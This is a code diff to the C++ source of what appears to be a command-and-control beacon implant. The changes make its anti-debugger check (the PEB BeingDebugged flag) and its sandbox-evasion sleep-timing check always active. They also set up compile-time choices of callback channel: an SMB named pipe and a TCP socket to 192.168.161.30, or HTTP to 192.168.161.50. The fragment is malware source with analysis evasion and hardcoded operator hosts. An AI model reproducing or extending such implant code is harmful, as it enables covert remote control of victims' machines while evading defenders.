@@ -21,7 +21,7 @@
 #include "taskRunner.h"
 #define MAX_CONNECTION_ERRORS 2
 #pragma warning(disable:4996)
-
+#include <winternl.h>
 using namespace std;
 using namespace transports;
 using namespace uuids;
@@ -478,9 +478,9 @@ void BeaconMainLoop(shared_ptr<Beacon> beacon) {
 //}
 int main()
 {
-#ifdef ANTIDEBUG
+
     PPEB pPEB = (PPEB)__readgsqword(0x60);
-    if (pPEB->BeingDebugged) return;
+    if (pPEB->BeingDebugged) return 0;
 
     ULONGLONG uptimeBeforeSleep = GetTickCount64();
     typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
@@ -490,12 +490,16 @@ int main()
     pNtDelayExecution(FALSE, &delay);
     ULONGLONG uptimeAfterSleep = GetTickCount64();
     if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
-#endif
+
 #ifdef  PIVOT
-    //instanceID = uuids::to_string(uuids::uuid_system_generator{}());
-    //unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
+#ifdef SMB
+    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
+#endif
+#ifdef TCP
     unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "192.168.161.30:9005" });
-#else
+#endif
+#endif
+#ifdef HTTP
     unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
 #endif
     //  PIVOT
